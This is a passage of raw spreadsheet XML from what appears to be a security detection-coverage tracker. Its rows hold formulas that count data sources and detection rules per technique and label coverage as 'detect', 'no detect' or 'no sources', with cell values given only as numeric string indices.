      <c r="C433" t="s">
        <v>2117</v>
      </c>
      <c r="D433" t="s">
        <v>806</v>
      </c>
      <c r="E433" t="s">
        <v>940</v>
      </c>
      <c r="F433" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G433" s="9" cm="1">
        <f t="array" ref="G433">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H433" s="9" t="str" cm="1">
        <f t="array" ref="H433">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I433" s="9" t="str" cm="1">
        <f t="array" ref="I433">IF(SUM(IF($C433=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C433=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J433" s="9" t="str" cm="1">
        <f t="array" ref="J43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33" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M433" s="9" cm="1">
        <f t="array" ref="M433">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N433" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O433" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P433" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S43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33" t="s">
        <v>368</v>
      </c>
      <c r="U433" t="s">
        <v>2118</v>
      </c>
      <c r="V433" t="s">
        <v>2119</v>
      </c>
      <c r="W433" t="b">
        <v>1</v>
      </c>
      <c r="X433" t="s">
        <v>2108</v>
      </c>
    </row>
    <row r="434" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A434" t="s">
        <v>2108</v>
      </c>
      <c r="B434" t="s">
        <v>2120</v>
      </c>
      <c r="C434" t="s">
        <v>2121</v>
      </c>
      <c r="D434" t="s">
        <v>806</v>
      </c>
      <c r="E434" t="s">
        <v>1698</v>
      </c>
      <c r="F434" s="9">
        <f t="shared" si="6"/>
        <v>3</v>
      </c>
      <c r="G434" s="9" cm="1">
        <f t="array" ref="G434">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H434" s="9" t="str" cm="1">
        <f t="array" ref="H434">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I434" s="9" t="str" cm="1">
        <f t="array" ref="I434">IF(SUM(IF($C434=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C434=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J434" s="9" t="str" cm="1">
        <f t="array" ref="J43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34" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M434" s="9" cm="1">
        <f t="array" ref="M434">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N434" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O434" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P434" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S43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34" t="s">
        <v>368</v>
      </c>
      <c r="U434" t="s">
        <v>2122</v>
      </c>
      <c r="V434" t="s">
        <v>2123</v>
      </c>
      <c r="W434" t="b">
        <v>1</v>
      </c>
      <c r="X434" t="s">
        <v>2108</v>
      </c>
    </row>
    <row r="435" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A435" t="s">
        <v>2108</v>
      </c>
      <c r="B435" t="s">
        <v>2124</v>
      </c>
      <c r="C435" t="s">
        <v>2125</v>
      </c>
      <c r="D435" t="s">
        <v>806</v>
      </c>
      <c r="E435" t="s">
        <v>940</v>
      </c>
      <c r="F435" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G435" s="9" cm="1">
        <f t="array" ref="G435">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H435" s="9" t="str" cm="1">
        <f t="array" ref="H435">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I435" s="9" t="str" cm="1">
        <f t="array" ref="I435">IF(SUM(IF($C435=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C435=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J435" s="9" t="str" cm="1">
        <f t="array" ref="J43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35" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M435" s="9" cm="1">
        <f t="array" ref="M435">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N435" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O435" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P435" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S43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35" t="s">
        <v>861</v>
      </c>
      <c r="U435" t="s">
        <v>2126</v>
      </c>
      <c r="W435" t="b">
        <v>1</v>
      </c>
      <c r="X435" t="s">
        <v>2108</v>
      </c>
    </row>
    <row r="436" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A436" t="s">
        <v>2127</v>
      </c>
      <c r="B436" t="s">
        <v>2127</v>
      </c>
      <c r="C436" t="s">
        <v>172</v>
      </c>
      <c r="D436" t="s">
        <v>7</v>
      </c>
      <c r="E436" t="s">
        <v>2128</v>
      </c>
      <c r="F436" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G436" s="9" cm="1">
        <f t="array" ref="G436">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H436" s="9" cm="1">
        <f t="array" ref="H436">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I436" s="9" t="str" cm="1">
        <f t="array" ref="I436">IF(SUM(IF($C436=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C436=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J436" s="9" cm="1">
        <f t="array" ref="J43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436" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M436" s="9" cm="1">
        <f t="array" ref="M436">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N436" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O436" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P436" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S43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36" t="s">
        <v>368</v>
      </c>
      <c r="U436" t="s">
        <v>2129</v>
      </c>
      <c r="V436" t="s">
        <v>2130</v>
      </c>
      <c r="W436" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="437" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A437" t="s">
        <v>2127</v>
      </c>
      <c r="B437" t="s">
        <v>2131</v>
      </c>
      <c r="C437" t="s">
        <v>317</v>
      </c>
      <c r="D437" t="s">
        <v>7</v>
      </c>
      <c r="E437" t="s">
        <v>2132</v>
      </c>
      <c r="F437" s="9">
        <f t="shared" si="6"/>
        <v>2</v>
      </c>
      <c r="G437" s="9" cm="1">
        <f t="array" ref="G437">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H437" s="9" t="str" cm="1">
        <f t="array" ref="H437">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I437" s="9" t="str" cm="1">
        <f t="array" ref="I437">IF(SUM(IF($C437=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C437=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J437" s="9" t="str" cm="1">
        <f t="array" ref="J43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37" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M437" s="9" cm="1">
        <f t="array" ref="M437">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N437" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O437" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P437" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S43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37" t="s">
        <v>386</v>
      </c>
      <c r="U437" t="s">
        <v>2133</v>
      </c>
      <c r="V437" t="s">
        <v>2134</v>
      </c>
      <c r="W437" t="b">
        <v>1</v>
      </c>
      <c r="X437" t="s">
        <v>2127</v>
      </c>
    </row>
    <row r="438" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A438" t="s">
        <v>2127</v>
      </c>
      <c r="B438" t="s">
        <v>2135</v>
      </c>
      <c r="C438" t="s">
        <v>2136</v>
      </c>
      <c r="D438" t="s">
        <v>7</v>
      </c>
      <c r="E438" t="s">
        <v>2137</v>
      </c>
      <c r="F438" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G438" s="9" cm="1">
        <f t="array" ref="G438">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H438" s="9" t="str" cm="1">
        <f t="array" ref="H438">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I438" s="9" t="str" cm="1">
        <f t="array" ref="I438">IF(SUM(IF($C438=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C438=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J438" s="9" t="str" cm="1">
        <f t="array" ref="J43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38" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M438" s="9" cm="1">
        <f t="array" ref="M438">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N438" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O438" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P438" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S43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38" t="s">
        <v>386</v>
      </c>
      <c r="U438" t="s">
        <v>2138</v>
      </c>
      <c r="V438" t="s">
        <v>2139</v>
      </c>
      <c r="W438" t="b">
        <v>1</v>
      </c>
      <c r="X438" t="s">
        <v>2127</v>
      </c>
    </row>
    <row r="439" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A439" t="s">
        <v>2127</v>
      </c>
      <c r="B439" t="s">
        <v>2140</v>
      </c>
      <c r="C439" t="s">
        <v>246</v>
      </c>
      <c r="D439" t="s">
        <v>7</v>
      </c>
      <c r="E439" t="s">
        <v>2141</v>
      </c>
      <c r="F439" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G439" s="9" cm="1">
        <f t="array" ref="G439">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H439" s="9" t="str" cm="1">
        <f t="array" ref="H439">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I439" s="9" t="str" cm="1">
        <f t="array" ref="I439">IF(SUM(IF($C439=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C439=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J439" s="9" t="str" cm="1">
        <f t="array" ref="J43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39" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M439" s="9" cm="1">
        <f t="array" ref="M439">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N439" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O439" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P439" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S43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39" t="s">
        <v>386</v>
      </c>
      <c r="U439" t="s">
        <v>2142</v>
      </c>
      <c r="V439" t="s">
        <v>2143</v>
      </c>
      <c r="W439" t="b">
        <v>1</v>
      </c>
      <c r="X439" t="s">
        <v>2127</v>
      </c>
    </row>
    <row r="440" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A440" t="s">
        <v>2127</v>
      </c>
      <c r="B440" t="s">
        <v>2144</v>
      </c>
      <c r="C440" t="s">
        <v>326</v>
      </c>
      <c r="D440" t="s">
        <v>7</v>
      </c>
      <c r="E440" t="s">
        <v>2141</v>
      </c>
      <c r="F440" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G440" s="9" cm="1">
        <f t="array" ref="G440">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H440" s="9" t="str" cm="1">
        <f t="array" ref="H440">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I440" s="9" t="str" cm="1">
        <f t="array" ref="I440">IF(SUM(IF($C440=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C440=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J440" s="9" t="str" cm="1">
        <f t="array" ref="J44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40" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M440" s="9" cm="1">
        <f t="array" ref="M440">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N440" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O440" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P440" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S44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40" t="s">
        <v>386</v>
      </c>
      <c r="U440" t="s">
        <v>2145</v>
      </c>
      <c r="V440" t="s">
        <v>2146</v>
      </c>
      <c r="W440" t="b">
        <v>1</v>
      </c>
      <c r="X440" t="s">
        <v>2127</v>
      </c>
    </row>
    <row r="441" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A441" t="s">
        <v>2127</v>
      </c>
      <c r="B441" t="s">
        <v>2147</v>
      </c>
      <c r="C441" t="s">
        <v>2148</v>
      </c>
      <c r="D441" t="s">
        <v>7</v>
      </c>
      <c r="E441" t="s">
        <v>2149</v>
      </c>
      <c r="F441" s="9">
        <f t="shared" si="6"/>
        <v>1</v>
      </c>
      <c r="G441" s="9" cm="1">
        <f t="array" ref="G441">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H441" s="9" t="str" cm="1">
        <f t="array" ref="H441">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I441" s="9" t="str" cm="1">
        <f t="array" ref="I441">IF(SUM(IF($C441=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C441=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J441" s="9" t="str" cm="1">
        <f t="array" ref="J44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41" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M441" s="9" cm="1">
        <f t="array" ref="M441">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N441" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O441" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P441" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S44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41" t="s">
        <v>503</v>
      </c>
      <c r="U441" t="s">
        <v>2150</v>
      </c>
      <c r="W441" t="b">
        <v>1</v>
      </c>
      <c r="X441" t="s">
        <v>2127</v>
      </c>
    </row>
    <row r="442" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A442" t="s">
        <v>2151</v>
      </c>
      <c r="B442" t="s">
        <v>2151</v>
      </c>
      <c r="C442" t="s">
        <v>79</v>
      </c>
      <c r="D442" t="s">
        <v>3</v>
      </c>
      <c r="E442" t="s">
        <v>2152</v>
      </c>
      <c r="F442" s="9">
        <f t="shared" si="6"/>
        <v>4</v>
      </c>
      <c r="G442" s="9" cm="1">
        <f t="array" ref="G442">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H442" s="9" cm="1">
        <f t="array" ref="H442">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I442" s="9" t="str" cm="1">
        <f t="array" ref="I442">IF(SUM(IF($C442=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C442=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J442" s="9" cm="1">
        <f t="array" ref="J44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442" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
